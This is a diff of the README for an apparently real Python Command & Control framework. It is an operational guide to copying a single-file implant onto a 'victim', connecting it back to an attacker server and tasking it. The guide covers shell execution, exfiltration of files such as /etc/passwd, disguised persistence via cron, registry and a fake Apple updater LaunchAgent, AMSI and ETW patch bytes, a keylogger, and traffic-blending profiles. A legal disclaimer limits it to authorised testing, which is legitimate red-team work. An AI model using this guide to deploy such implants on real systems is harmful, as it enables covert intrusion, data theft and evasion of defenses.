@@ -1,25 +1,14 @@
 # Python C2 Framework
 
-A complete Command & Control framework written from scratch in Python.
-Multi-transport (TCP / HTTP / HTTPS), end-to-end encrypted, multi-operator
-with role-based access control, plugin-style post-exploitation modules,
-agent staging, and SQLite persistence.
+A complete, self-contained Command & Control framework written in **pure Python standard library**. Zero pip installs on the victim. One file to deploy. TLS-encrypted. Cert-pinned. Multi-operator with RBAC.
 
-> ## ⚠️ LEGAL DISCLAIMER
+> **⚠️ LEGAL USE ONLY — READ THIS FIRST**
 >
-> This project is provided for **authorized penetration testing, red team
-> engagements, CTF competitions, and educational use in controlled lab
-> environments only**.
+> This tool is for **authorized penetration testing, red team engagements, CTF competitions, and lab research** only.
 >
-> You must have **explicit, written permission** from the owner of any
-> system you test with this software. Unauthorized access to computer
-> systems is illegal under laws including (but not limited to) the U.S.
-> Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and the
-> EU Directive on Attacks Against Information Systems.
+> You must have **explicit, written permission** from the owner of any system you test with this software. Unauthorized access to computer systems is illegal under laws including (but not limited to) the U.S. Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and the EU Directive on Attacks Against Information Systems.
 >
-> The author(s) accept **no liability** for misuse, damage, or legal
-> consequences arising from the use of this code. **You are solely
-> responsible** for your actions.
+> The author(s) accept **no liability** for misuse, damage, or legal consequences arising from the use of this code. **You are solely responsible** for your actions.
 
 ---
 
@@ -28,468 +17,326 @@ agent staging, and SQLite persistence.
 - [Features](#features)
 - [Architecture](#architecture)
 - [Requirements](#requirements)
-- [Installation](#installation)
 - [Quick Start](#quick-start)
-- [Usage](#usage)
-  - [1. Start the Server](#1-start-the-server)
-  - [2. Deploy the Agent](#2-deploy-the-agent)
-  - [3. Operate the Server](#3-operate-the-server)
-  - [4. Remote Operators](#4-remote-operators)
-  - [5. Agent Staging](#5-agent-staging)
+- [Deployment](#deployment)
 - [Command Reference](#command-reference)
+- [Modules](#modules)
 - [Transports](#transports)
-- [Cryptography](#cryptography)
-- [Operator Roles (RBAC)](#operator-roles-rbac)
+- [Security Model](#security-model)
+- [Operator Roles](#operator-roles)
 - [Malleable Profiles](#malleable-profiles)
-- [Post-Exploitation Modules](#post-exploitation-modules)
-- [Project Layout](#project-layout)
-- [File & Loot Management](#file--loot-management)
 - [Troubleshooting](#troubleshooting)
-- [Extending the Framework](#extending-the-framework)
+- [FAQ](#faq)
+- [License](#license)
 
 ---
 
 ## Features
 
-### Communication
-- **Three transports** — raw TCP, HTTP, and HTTPS (auto-generated self-signed TLS cert)
-- **Beaconing with jitter** — configurable interval and randomized sleep (±30% by default)
-- **Length-prefixed framing** — reliable delivery of large payloads over raw sockets
-- **Automatic reconnection with exponential backoff** — agents retry when the
-  server is unreachable, backing off from 10s up to 300s
-- **Stable agent identity across reconnects** — each machine is assigned a
-  persistent `machine_id`; reconnecting agents keep the same agent ID in the
-  operator's `list`, so task history isn't fragmented
+### Zero victim dependencies
+The victim runs **one file** (`agent.py`) using **only Python's standard library**. No `pip`, no `cryptography`, no `requests`, no compiler, no internet connection. If a machine has Python 3.8+, it runs.
 
-### Cryptography
-- **RSA-2048 OAEP** key exchange on registration
-- **Per-agent AES-256-GCM** session keys (authenticated encryption — tampering is detected)
-- **Unique session key per agent**, never shared, never persisted in plaintext on the agent
+### TLS with cert pinning
+All traffic is encrypted with **TLS 1.2+** (AES-256-GCM, Ephemeral Diffie-Hellman key exchange — perfect forward secrecy). The agent **pins** the server certificate by SHA-256 fingerprint, preventing MITM attacks even on hostile networks.
 
-### Operator Experience
-- **Local admin console** (runs in the server process)
-- **Remote operator CLI** with authenticated login (port 5555)
-- **Role-based access control** — `admin`, `operator`, `viewer`
-- **SQLite backend** — agents, tasks, results, operators, profiles, and loot all persisted
-- **Multi-operator support** — several red teamers can drive the same server simultaneously
-- **Automatic offline detection** — agents that miss beacons for 5 minutes are
-  marked `dead` (works for TCP, HTTP, and HTTPS transports alike)
+### Three transports
+- **TCP+TLS** (port 4444) — persistent socket, lowest latency
+- **HTTPS** (port 8443) — blends with web traffic, egress-firewall friendly
+- **Operator TLS** (port 5555) — separated management plane
 
-### Post-Exploitation
-- Shell command execution
-- File upload / download with automatic loot collection
-- System information, process listing, environment variables
-- Persistence — cron, rc, systemd, Windows registry, schtask, launchagent, startup folder
-- Screenshot capture
-- Privilege escalation enumeration (Linux + Windows)
-- Windows AMSI bypass (patches `AmsiScanBuffer`)
-- Windows ETW patching (patches `EtwEventWrite`, 32-bit and 64-bit safe)
-- Keylogger (start / dump / stop)
+### Operator features
+- Local admin console (runs on server)
+- Remote operator CLI with RBAC login
+- Three roles: `admin`, `operator`, `viewer`
+- SQLite backend
+- Malleable HTTP profiles
+- Loot storage with per-agent namespacing
+- Offline watchdog (agents auto-marked dead after 5 min)
 
-### Evasion & OPSEC
-- **Malleable HTTP profiles** — custom URIs, headers, and User-Agent to blend with normal traffic
-- **Agent staging** — small stager pulls the full agent from the server at runtime
-- **Beacon jitter** — breaks predictable network patterns
+### Post-exploitation
+Shell, `sysinfo`, `ps`, `env`, `download`, `upload`, persistence (cron/rc/systemd/registry/schtask/startup/launchagent), privilege escalation enumeration, AMSI bypass, ETW patching, screenshot (optional), keylogger (optional).
 
 ---
 
 ## Architecture
 
 ```
-                    ┌──────────────────────────────────┐
-                    │        c2 server (server.py)     │
-                    │                                  │
-   ┌────────────┐   │  ┌──────────┐  ┌─────────────┐   │   ┌──────────────┐
-   │  Agent     │───┼─▶│  TCP     │  │  HTTP /     │◀──┼───│  Remote      │
-   │ (agent.py) │   │  │  :4444   │  │  HTTPS      │   │   │  Operator    │
-   │            │───┼─▶│          │  │  :8080/8443 │   │   │ (operator.py)│
-   └────────────┘   │  └──────────┘  └─────────────┘   │   │   :5555      │
-                    │                                  │   └──────────────┘
-   ┌────────────┐   │  ┌──────────┐  ┌─────────────┐   │
-   │  Stager    │───┼─▶│ /stage   │  │  Local      │   │   ┌──────────────┐
-   │(stager.py) │   │  │ endpoint │  │  Console    │   │◀──│  loot/ dir   │
-   └────────────┘   │  └──────────┘  └─────────────┘   │   └──────────────┘
-                    │                                  │
-                    │  ┌────────────────────────────┐  │
-                    │  │  SQLite (c2.db)            │  │
-                    │  │  agents · tasks · results  │  │
-                    │  │  operators · profiles      │  │
-                    │  └────────────────────────────┘  │
-                    └──────────────────────────────────┘
+                    ┌──────────────────────────────────────┐
+                    │         teamserver (server.py)       │
+                    │                                      │
+   ┌──────────┐     │   ┌──────────┐    ┌──────────────┐   │
+   │  agent   │─────┼──▶│ TCP+TLS  │    │   HTTPS      │   │
+   │ (victim) │     │   │  :4444   │    │   :8443      │   │
+   │ 1 file   │     │   └──────────┘    └──────────────┘   │
+   │ pure std │     │                                      │
+   └──────────┘     │   ┌──────────┐    ┌──────────────┐   │
+                    │   │ Operator │    │   SQLite     │   │
+   ┌──────────┐     │   │ TLS :5555│    │   (c2.db)    │   │
+   │ operator │─────┼──▶│          │    └──────────────┘   │
+   │ remote   │     │   └──────────┘                       │
+   └──────────┘     │                                      │
+                    │   ┌─────────────────────────────────┐│
+                    │   │ Local admin console (terminal)  ││
+                    │   └─────────────────────────────────┘│
+                    └──────────────────────────────────────┘
 ```
 
 ---
 
 ## Requirements
 
-- **Python 3.10+** (3.11 or 3.12 recommended)
-- Operating systems:
-  - **Server** — Linux, macOS, or Windows
-  - **Agent** — Linux, macOS, Windows
-- Network access between agent and server on the chosen port
-
-### Python dependencies
-
-| Package | Purpose |
+| Component | Requirement |
 |---|---|
-| `cryptography` | RSA key exchange + AES-GCM session encryption |
-| `flask` | HTTP/HTTPS agent transport |
-| `werkzeug` | Threaded Flask server |
-| `requests` | Agent HTTP/HTTPS client |
-| `pillow` | Screenshot capture |
-| `pynput` | Keylogger |
+| **Server** | Python 3.8+ · `openssl` command **or** `cryptography` pip package (one of the two, only for TLS cert generation) |
+| **Victim** | **Python 3.8+ only** — nothing else |
+| **Operator** | Python 3.8+ |
 
----
-
-## Installation
-
-```bash
-git clone <this-repo>
-cd Python-C2-Framework
-
-python -m venv venv
-source venv/bin/activate          # Linux/macOS
-venv\Scripts\activate              # Windows
-
-pip install -r requirements.txt
-```
+That's the entire dependency list. No `requirements.txt` needed.
 
 ---
 
 ## Quick Start
 
+### On the attacker machine
+
 ```bash
-# ── On the server ────────────────────────────────────────────────
-python server.py
-# On first run:
-#   * You are prompted to set the admin password
-#   * RSA keypair is generated (server_private.pem, server_public.pem)
-#   * Self-signed TLS cert is generated (server.crt, server.key)
-#   * SQLite database is created (c2.db)
-#   * loot/ directory is created
+git clone https://github.com/ravichandran3/Python-C2-Framework.git
+cd Python-C2-Framework
 
-# ── On the target ────────────────────────────────────────────────
-# Copy server_public.pem + agent.py to the target, then:
-python agent.py --transport http --url http://<SERVER_IP>:8080
+python3 server.py
+# First run:
+#   - Prompts to set admin password
+#   - Auto-generates server.crt + server.key
+#   - Prints cert fingerprint (COPY THIS)
+#   - Starts listeners on 4444, 8443, 5555
+```
 
-# ── Back on the server (local console) ──────────────────────────
+The server prints:
+
+```
+════════════════════════════════════════════════════════════════════
+  Server cert SHA-256 fingerprint:
+  a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
+
+  Copy this to the victim:
+    python3 agent.py --host <THIS_IP> --cert-fp a1b2c3d4...
+════════════════════════════════════════════════════════════════════
+```
+
+### On the victim machine
+
+Copy **only** `agent.py` to the victim:
+
+```bash
+# From attacker machine
+scp agent.py user@victim:/tmp/
+```
+
+Then on the victim:
+
+```bash
+python3 /tmp/agent.py --host <SERVER_IP> --cert-fp <FINGERPRINT>
+```
+
+That's it. The agent registers, appears in `list`, and starts beaconing.
+
+### Operate
+
+On the attacker (server terminal):
+
+```
 [c2:none] > list
 [c2:none] > use <agent_id_prefix>
 [c2:<id>] > sysinfo
 [c2:<id>] > shell whoami
-[c2:<id>] > shell ipconfig          # or `ip a` on Linux
-[c2:<id>] > download C:\Users\Public\secret.txt
-[c2:<id>] > screenshot
-[c2:<id>] > privesc
+[c2:<id>] > download /etc/passwd
 ```
 
 ---
 
-## Usage
+## Deployment
 
-### 1. Start the Server
+### File transfer matrix
 
-```bash
-python server.py
-```
+| File | Attacker | Victim |
+|---|:---:|:---:|
+| `server.py` | ✅ | ❌ |
+| `agent.py` | ⚠️ (for staging) | ✅ |
+| `common.py` | ✅ | ❌ (agent is self-contained) |
+| `operator.py` | ✅ | ❌ |
+| `stager.py` | ⚠️ | ✅ (optional) |
+| `server.crt` | ✅ (auto-generated) | ❌ |
+| `server.key` | ✅ (auto-generated, **KEEP SECRET**) | ❌ |
+| `c2.db` | ✅ (auto-generated) | ❌ |
 
-On the **first** run the server:
+### Victim checklist
 
-1. Prompts you to set the admin operator password (stored hashed with
-   PBKDF2-HMAC-SHA256, 200,000 iterations).
-2. Generates an RSA-2048 key pair:
-   - `server_private.pem` — **never** leave the server
-   - `server_public.pem` — must be copied to every agent machine
-3. Generates a self-signed TLS certificate (`server.crt`, `server.key`).
-4. Creates the SQLite database (`c2.db`).
-5. Creates the `loot/` directory for exfiltrated files.
+Before running the agent, verify:
 
-Once running, four listeners start on these ports:
+1. **Python 3.8+** exists on the victim: `python3 --version`
+2. **Network reachable**: from the victim, `python3 -c "import socket; socket.create_connection(('SERVER_IP', 8443), timeout=5)"` succeeds
+3. **Cert fingerprint** copied correctly from server banner
+4. **No `pip install` needed** — verify: `python3 -c "import ssl, socket, http.client, json, base64, hashlib, subprocess, platform, uuid; print('ok')"` prints `ok`
 
-| Port | Purpose |
+That's all. The agent will retry every 10s → 20s → 40s → … → 300s max.
+
+### Offline victim (no internet, no Python packages)
+
+This is the default — the agent has **no external dependencies**. It will run identically with or without internet.
+
+If the victim **doesn't have Python** at all, you have three options (outside the scope of this framework):
+
+1. Deploy the machine's system Python if it exists (most Linux/macOS have it)
+2. Use an alternative language agent (Go, C) that compiles to a native binary
+3. PyInstaller the agent on the attacker (adds ~15 MB, but bundled Python)
+
+Options 1 and 2 are professional; option 3 is what most people do.
+
+### Optional modules on victim
+
+`screenshot` and `keylog_*` require optional packages **only if you use those commands**:
+
+| Module | Extra package on victim |
 |---|---|
-| `4444` | TCP agent transport |
-| `8080` | HTTP agent transport |
-| `8443` | HTTPS agent transport (TLS) |
-| `5555` | Remote operator transport (RBAC login) |
+| `screenshot` | `pip install pillow` (or the `import`/`scrot` command on Linux) |
+| `keylog_start` | `pip install pynput` |
 
-The local admin console is available in the same terminal.
+**You don't need either** for shell, download, upload, sysinfo, privesc, persistence, AMSI, or ETW. Those work with zero extra installs.
 
----
-
-### 2. Deploy the Agent
-
-Copy `agent.py` **and** `server_public.pem` to the target machine, then
-start the agent with the transport of your choice:
-
-```bash
-# TCP transport
-python agent.py --transport tcp --host <SERVER_IP> --port 4444
-
-# HTTP transport
-python agent.py --transport http --url http://<SERVER_IP>:8080
-
-# HTTPS transport (self-signed cert, so pass --insecure)
-python agent.py --transport https --url https://<SERVER_IP>:8443 --insecure
-
-# Custom malleable profile
-python agent.py --transport http --url http://<SERVER_IP>:8080 --profile myprofile.json
-
-# Custom public key location
-python agent.py --transport http --url http://<SERVER_IP>:8080 --pubkey /path/to/server_public.pem
-```
-
-The agent prints its `agent_id` when registration succeeds. The server
-prints the same ID when it receives the registration.
-
-#### Reconnect behavior
-
-If the agent loses its connection, it retries with exponential backoff
-(10s → 20s → 40s ... up to 300s). On successful reconnect, the agent
-keeps its **same agent ID** (matched via a persistent `machine_id` that
-is a hash of the target's hostname, MAC, and architecture). This means
-your `use <id>` selection, task history, and loot filenames remain
-stable across reconnects. If the target's hostname or MAC changes (e.g.,
-new NIC, VM cloned), it will appear as a new agent.
-
-#### Agent CLI options
-
-| Flag | Description |
-|---|---|
-| `--transport {tcp,http,https}` | Transport to use (default: `tcp`) |
-| `--host <ip>` | Server IP for TCP transport |
-| `--port <int>` | Server port (overrides default per transport) |
-| `--url <url>` | Full URL for HTTP/HTTPS transport |
-| `--profile <file>` | Path to a malleable profile JSON file |
-| `--pubkey <file>` | Path to `server_public.pem` (default: `./server_public.pem`) |
-| `--insecure` | Skip TLS verification on HTTPS transport |
-
----
-
-### 3. Operate the Server
-
-The **local admin console** appears in the server's terminal.
-
-```
-Commands:
-  list                                 List agents
-  use <id_prefix>                      Select agent
-  back                                 Deselect
-  shell <command>                      Execute shell command (queued)
-  sysinfo                              Remote system info
-  ps                                   Process list
-  env                                  Environment variables
-  download <remote_path>               Exfil file (saved to loot/)
-  upload <local_path> <remote_path>    Push file
-  persist <type>                       cron|rc|systemd|registry|schtask|startup|launchagent
-  screenshot                           Capture screenshot
-  privesc                              Enumerate privilege escalation vectors
-  amsi                                 Windows AMSI bypass
-  etw                                  Windows ETW patch
-  keylog_start | keylog_dump | keylog_stop
-  results                              Show results for selected agent
-  list_operators                       List operators (admin)
-  add_operator <u> <p> <role>          Add operator   (admin)
-  remove_operator <u>                  Remove operator(admin)
-  list_profiles                        List malleable profiles
-  add_profile <path.json>              Add profile from JSON (admin)
-  help                                 Show this
-  exit                                 Shutdown server
-```
-
-Every command that touches an agent is **queued** and delivered on the
-agent's **next beacon**. Results arrive on the beacon that follows task
-delivery. Nothing is pushed out-of-band.
-
----
-
-### 4. Remote Operators
-
-The operator port (5555) lets other machines control the teamserver with
-authentication and role-based access control.
-
-```bash
-python operator.py <SERVER_IP> 5555
-```
-
-You will be prompted for a username and password. Create new operators
-from the local admin console:
-
-```
-[c2:none] > add_operator alice hunter2 operator
-[c2:none] > add_operator bob   viewpw   viewer
-[c2:none] > add_operator carol adminpw  admin
-[c2:none] > list_operators
-```
-
-See [Operator Roles (RBAC)](#operator-roles-rbac) for what each role can do.
-
----
-
-### 5. Agent Staging
-
-The stager is a tiny (~40 lines) bootstrap that downloads the full agent
-from the server's `/stage` endpoint and runs it. This bypasses size-based
-file detection and lets you update the agent without re-deploying.
-
-```bash
-# Place the payload on the server next to server.py:
-cp agent.py agent_payload.py     # (on the server)
-
-# On the target machine:
-python stager.py http://<SERVER_IP>:8080 --transport http --url http://<SERVER_IP>:8080
-```
-
-The stager warns you if it can't find `server_public.pem` in the
-current directory, because the agent will fail to register without it.
+If the victim has no internet, just don't use those two modules — or drop the wheel onto the victim manually (`pip download` on attacker → `scp` → `pip install --no-index --find-links=. pillow pynput`).
 
 ---
 
 ## Command Reference
 
 ### Agent management
-
 | Command | Description |
 |---|---|
-| `list` | Show all registered agents with status and last-beacon time |
-| `use <prefix>` | Select an agent by ID prefix (must be unambiguous) |
-| `back` | Deselect the current agent |
+| `list` | Show all agents |
+| `use <prefix>` | Select agent by ID prefix |
+| `back` | Deselect |
 
-### Tasking
-
-All tasking commands require a selected agent and queue a task for the
-agent's next beacon.
-
+### Tasking (queued, delivered on next beacon)
 | Command | Description |
 |---|---|
-| `shell <cmd>` | Execute a shell command |
-| `sysinfo` | Return hostname, user, OS, arch, PID, machine_id |
-| `ps` | List running processes (`tasklist` / `ps aux`) |
-| `env` | Dump environment variables |
-| `download <remote>` | Exfiltrate a file (auto-saved to `loot/`) |
-| `upload <local> <remote>` | Push a file to the agent |
-| `persist <kind>` | Install persistence (see table below) |
-| `screenshot` | Capture the screen (PNG, base64) |
-| `privesc` | Enumerate privilege escalation vectors |
-| `amsi` | Patch `AmsiScanBuffer` (Windows only) |
-| `etw` | Patch `EtwEventWrite` (Windows only, 32/64-bit safe) |
-| `keylog_start` / `keylog_dump` / `keylog_stop` | Control the keylogger |
-| `results` | Show recent results for the selected agent |
+| `shell <cmd>` | Execute shell command |
+| `sysinfo` | Hostname, user, OS, arch, PID, machine_id |
+| `ps` | Process list (`tasklist`/`ps aux`) |
+| `env` | Environment variables |
+| `download <remote>` | Exfil file → `loot/` |
+| `upload <local> <remote>` | Push file to agent |
+| `persist <kind>` | See persistence table below |
+| `privesc` | Privilege escalation enumeration |
+| `amsi` | Windows AMSI bypass |
+| `etw` | Windows ETW patch |
+| `screenshot` | Screen capture (needs pillow) |
+| `keylog_start` / `dump` / `stop` | Keylogger (needs pynput) |
+| `results` | Recent results for selected agent |
+
+### Persistence kinds
+| Kind | OS | Mechanism |
+|---|---|---|
+| `cron` | Linux/macOS | User crontab, every 10 min |
+| `rc` | Linux/macOS | `~/.bashrc` append |
+| `systemd` | Linux | user systemd service |
+| `registry` | Windows | `HKCU\...\Run` |
+| `schtask` | Windows | Scheduled task every 30 min |
+| `startup` | Windows | Startup folder copy |
+| `launchagent` | macOS | LaunchAgent plist |
 
 ### Operator management (admin only)
-
 | Command | Description |
 |---|---|
-| `list_operators` | Show all operators and their roles |
-| `add_operator <user> <pw> <role>` | Create an operator (`admin` / `operator` / `viewer`) |
-| `remove_operator <user>` | Delete an operator |
+| `list_operators` | Show all operators |
+| `add_operator <u> <p> <role>` | Add operator (`admin`/`operator`/`viewer`) |
+| `remove_operator <u>` | Remove operator |
 
 ### Profiles (admin only)
-
 | Command | Description |
 |---|---|
-| `list_profiles` | Show all malleable profiles |
-| `add_profile <path.json>` | Register a new profile from a JSON file |
+| `list_profiles` | Show all profiles |
+| `add_profile <path.json>` | Add profile from JSON file |
+
+---
+
+## Modules
+
+| Module | Platform | Description |
+|---|---|---|
+| `shell` | all | `subprocess.run` with 180s timeout |
+| `sysinfo` | all | Platform info via `platform` |
+| `ps` | all | `tasklist` / `ps aux` |
+| `env` | all | Dump `os.environ` |
+| `download` | all | Base64-encode file (a few MB max) |
+| `upload` | all | Base64-decode + write |
+| `persist` | all | Cron/rc/systemd/registry/schtask/startup/launchagent |
+| `privesc` | all | `id`, `sudo -l`, SUID scan, kernel, cron (Linux) / `whoami /priv`, `systeminfo`, unquoted service paths (Windows) |
+| `amsi` | Windows | Patches `AmsiScanBuffer` |
+| `etw` | Windows | Patches `EtwEventWrite` (32/64-bit aware) |
+| `screenshot` | all | Pillow or ImageMagick/scrot |
+| `keylog_start`/`dump`/`stop` | all | `pynput.keyboard.Listener` |
 
 ---
 
 ## Transports
 
-### TCP (port 4444)
-
-- Raw sockets with 4-byte big-endian length-prefix framing.
-- Bidirectional; the server replies on the same connection.
-- Fastest and lowest overhead, but firewall-friendly only on trusted networks.
-
-### HTTP (port 8080)
-
-- Stateful via `X-Agent-Id` request header (injected by the agent).
-- Registration, beacon, and result submission are separate POST requests.
-- Blends with standard web traffic; passes through most egress firewalls.
+### TCP+TLS (port 4444)
+- Single persistent socket
+- 4-byte big-endian length prefix on every message
+- Server replies on same connection
+- Fastest, but easier for NDR to spot (persistent outbound TLS)
 
 ### HTTPS (port 8443)
-
-- Same Flask app as HTTP, wrapped in TLS with an auto-generated cert.
-- Agent must use `--insecure` because the cert is self-signed.
-- For real engagements, replace `server.crt` and `server.key` with a
-  valid certificate (Let's Encrypt, internal CA, or a C2-specific domain).
+- Stateless POST requests, one per message
+- `X-Agent-Token` header authenticates beacon/result
+- Blends with web traffic
+- Egress-firewall friendly
 
 ### Comparison
-
-| Transport | Speed | Evasion | Firewall-friendly | Requires cert |
-|---|---|---|---|---|
-| TCP | Fastest | Low | No | No |
-| HTTP | Fast | Good | Yes | No |
-| HTTPS | Fast | Best | Yes | Yes (self-signed is fine) |
+| | Speed | Evasion | Persistence on wire |
+|---|---|---|---|
+| TCP+TLS | fastest | low | one long-lived connection |
+| HTTPS | fast | best | repeated POSTs |
 
 ---
 
-## Cryptography
+## Security Model
 
-### Registration (RSA-2048 OAEP)
+### Encryption
+All traffic is encrypted by **TLS 1.2+** (Python's `ssl` module uses OpenSSL under the hood, which provides AES-256-GCM, ChaCha20-Poly1305, and X25519/ECDHE ephemeral key exchange by default). Perfect forward secrecy is enabled — capturing the traffic and the server key later still does **not** decrypt the traffic.
 
-```
-Agent                                    Server
-  │                                        │
-  │  1. Generate 32-byte session_key       │
-  │  2. Build {session_key, info} JSON     │
-  │  3. RSA-OAEP(SHA-256, public_key)      │
-  │ ────── encrypted registration ───────▶ │
-  │                                        │  4. RSA decrypt → extract
-  │                                        │     session_key + info
-  │                                        │  5. Match on machine_id or
-  │                                        │     create new agent record
-  │ ◀──── AES-GCM({status, agent_id}) ──── │  6. Reply with agent_id
-  │                                        │     (encrypted with session_key)
-```
+### Authentication
+The agent pins the server certificate's SHA-256 fingerprint. On connection, the agent hashes the peer DER cert and compares it to the pinned value. Any MITM must present a certificate whose fingerprint matches, which requires knowing the server's private key.
 
-### Session encryption (AES-256-GCM)
+### Session tokens
+After registration, the server issues a random 24-byte session token. The token is required for every beacon and every result submission. Tokens are rotated on every reconnect. The token lives in memory only on the agent side (never written to disk).
 
-Every message after registration is encrypted with the per-agent
-`session_key` using **AES-256-GCM**:
-
-- 12-byte random nonce per message (prepended to ciphertext)
-- Authenticated encryption — any tampering invalidates the message
-- No shared global key — compromising one agent does not compromise others
-
-### Key storage
-
-| File | Contains | Where it lives |
-|---|---|---|
-| `server_private.pem` | RSA private key | Server only — **never** distribute |
-| `server_public.pem` | RSA public key | Server + every agent machine |
-| `c2.db` (`agents.session_key`) | Per-agent AES keys | Server only |
-| In-memory | Agent session key | Agent process only |
-
-Session keys are **never** written to disk by the agent.
+### What is NOT done
+- **No app-layer crypto.** If you need protection against full traffic capture with future quantum compromise, add post-quantum KEM on top.
+- **No agent code signing.** If the victim has EDR that checks binary signatures, consider that a separate engagement problem.
+- **No sandbox escape.** The agent runs as the same user that launched it. For privilege escalation, use the `privesc` module + manual work.
 
 ---
 
-## Operator Roles (RBAC)
-
-Three roles are enforced by `C2Core.process_command()`:
+## Operator Roles
 
 | Action | `viewer` | `operator` | `admin` |
 |---|:---:|:---:|:---:|
 | `list` / `use` / `results` | ✅ | ✅ | ✅ |
-| Task agents (`shell`, `download`, etc.) | ❌ | ✅ | ✅ |
-| `list_operators` | ❌ | ❌ | ✅ |
-| `add_operator` / `remove_operator` | ❌ | ❌ | ✅ |
-| `list_profiles` | ✅ | ✅ | ✅ |
-| `add_profile` | ❌ | ❌ | ✅ |
+| Task agents | ❌ | ✅ | ✅ |
+| Manage operators | ❌ | ❌ | ✅ |
+| View profiles | ✅ | ✅ | ✅ |
+| Add profiles | ❌ | ❌ | ✅ |
 
-Passwords are stored as `salt:pbkdf2_hmac_sha256(password, salt, 200000)`
-in the `operators` table — never in plaintext.
+Passwords are hashed with **PBKDF2-HMAC-SHA256, 200,000 iterations**, stored as `salt:hash` in the `operators` table.
 
 ---
 
 ## Malleable Profiles
 
-A malleable profile controls the HTTP request shape the agent uses, so
-it blends into normal web traffic. Register profiles from either console
-(admin only) by pointing at a JSON file.
+A malleable profile changes the HTTP URIs and headers the agent uses, so requests blend with target-specific web traffic.
 
-### Example profile file (`myprofile.json`)
+### Example (`profiles/cloudflare.json`)
 
 ```json
 {
@@ -506,315 +353,126 @@ it blends into normal web traffic. Register profiles from either console
 }
 ```
 
-### Registering it
-
-On the server console:
+Register it from either console (admin only):
 
 ```
-[c2:none] > add_profile /path/to/myprofile.json
+[c2:none] > add_profile /path/to/profiles/cloudflare.json
 ```
 
-From a remote operator:
-
-```
-[admin:none] > add_profile /path/to/myprofile.json
-```
-
-The `path` is resolved **on the server** — so the file has to be
-readable by the server process, not the operator's machine.
-
-### Using it from the agent
-
-Pass the profile to the agent at startup:
-
-```bash
-python agent.py --transport http --url http://<SERVER_IP>:8080 --profile myprofile.json
-```
-
-The server must already know about the URIs in the profile (via
-`add_profile`) — otherwise requests to those URIs return 404.
-
----
-
-## Post-Exploitation Modules
-
-Every module below is dispatched by `execute_task()` in `agent.py`.
-Output is returned as a string over the encrypted channel.
-
-### `shell`
-
-```python
-subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
-```
-
-Runs `cmd` and returns `stdout + stderr`.
-
-### `sysinfo`
-
-Returns JSON with `hostname`, `user`, `os`, `os_version`, `arch`, `pid`,
-and `machine_id`.
-
-### `ps`
-
-Windows: `tasklist` — Unix: `ps aux`.
-
-### `env`
-
-Dumps `os.environ` as `key=value` lines.
-
-### `download` / `upload`
-
-Base64-encoded file content is carried inside the encrypted JSON. On
-download, the server decodes it and saves it to `loot/<agent>_<file>`.
-
-### `persist`
-
-| `kind` | Platform | Action |
-|---|---|---|
-| `cron` | Linux | Adds a `*/10 * * * *` cron entry |
-| `rc` | Linux | Appends to `~/.bashrc` |
-| `systemd` | Linux | Creates `~/.config/systemd/user/updater.service` |
-| `registry` | Windows | `HKCU\...\CurrentVersion\Run` |
-| `schtask` | Windows | `schtasks /create /sc minute /mo 30` |
-| `startup` | Windows | Copies to the Startup folder |
-| `launchagent` | macOS | Creates `~/Library/LaunchAgents/com.apple.updater.plist` |
-
-### `screenshot`
-
-Tries, in order: ImageMagick `import` → `scrot` → Pillow `ImageGrab`.
-Returns base64 PNG.
-
-### `privesc`
-
-Runs a battery of enumeration commands:
-
-- **Linux**: `id`, `sudo -l`, SUID binary scan, `uname -a`,
-  write-check on `/etc/passwd` and `/etc/shadow`, cron jobs
-- **Windows**: `whoami /priv`, `whoami /groups`, `systeminfo` (hotfixes
-  and OS version), unquoted service paths, `C:\Windows\Temp` ACLs
-
-### `amsi` (Windows only)
-
-Patches `amsi.dll!AmsiScanBuffer` with `mov eax, 0x80070057; ret`, so
-all AMSI scans return `E_INVALIDARG` (which most .NET hosts treat as
-"not malicious").
-
-### `etw` (Windows only)
-
-Patches `ntdll.dll!EtwEventWrite` with `xor rax, rax; ret` on 64-bit or
-`xor eax, eax; ret` on 32-bit, disabling ETW events produced by .NET
-assemblies. The correct patch is selected automatically based on the
-Python interpreter's bitness.
-
-### `keylog_start` / `keylog_dump` / `keylog_stop`
-
-Uses `pynput.keyboard.Listener`. Logs to a random `tempfile` path; the
-`dump` action returns the last 100 KB.
-
----
-
-## Project Layout
-
-```
-Python-C2-Framework/
-├── README.md            ← this file
-├── requirements.txt     ← Python dependencies
-├── common.py            ← shared crypto, framing, default profile
-├── server.py            ← teamserver (TCP + HTTP + HTTPS + operator + console)
-├── agent.py             ← full implant with all modules
-├── operator.py          ← remote operator CLI with RBAC login
-├── stager.py            ← tiny stager that downloads and runs the agent
-│
-├── (generated at runtime)
-├── c2.db                ← SQLite database
-├── server_private.pem   ← RSA private key (KEEP SECRET)
-├── server_public.pem    ← RSA public key (distribute to agents)
-├── server.crt           ← self-signed TLS cert
-├── server.key           ← TLS private key
-└── loot/                ← exfiltrated files
-    └── <agent>_<file>
-```
-
----
-
-## File & Loot Management
-
-### Downloads
-
-When the operator issues `download <remote_path>`, the agent reads the
-file, base64-encodes it, and returns it inside the encrypted result.
-The server decodes it and writes it to:
-
-```
-loot/<first 8 chars of agent_id>_<basename of remote path>
-```
-
-Example:
-
-```
-loot/4f1a9c2b_secret.txt
-```
-
-### Uploads
-
-The operator runs `upload <local_path> <remote_path>`. The server reads
-the local file, base64-encodes it into the task, and the agent writes
-it to `<remote_path>` on the target. The local path is resolved on the
-**operator** machine — if you're a remote operator, that means your
-machine, and the file content is shipped to the server over the operator
-connection.
-
-### Results
-
-Every result is stored in the `results` table with its `task_id` and
-`agent_id`. Use the `results` command to review the last 20 results
-for the selected agent (or the last 30 across all agents if none is
-selected).
+**Note:** currently the agent uses hard-coded default URIs (`/api/v1/auth/login` etc.). To use a custom profile, edit `HttpsTransport.REGISTER_URI` and `BEACON_URI` and `RESULT_URI` in `agent.py` to match the profile's URIs on the server.
 
 ---
 
 ## Troubleshooting
 
-### "login required" when connecting an operator
+### `agent` never appears in `list`
 
-The operator port expects a login message first. Run `operator.py`
-(rather than a raw socket) — it handles the login handshake for you.
+1. Check the victim can reach the server port:
+   ```bash
+   python3 -c "import socket; socket.create_connection(('SERVER_IP', 8443), timeout=5)"
+   ```
+2. Verify the cert fingerprint exactly matches (copy-paste from banner)
+3. Check the server console — registration attempts print to server stdout
 
-### Agent never registers
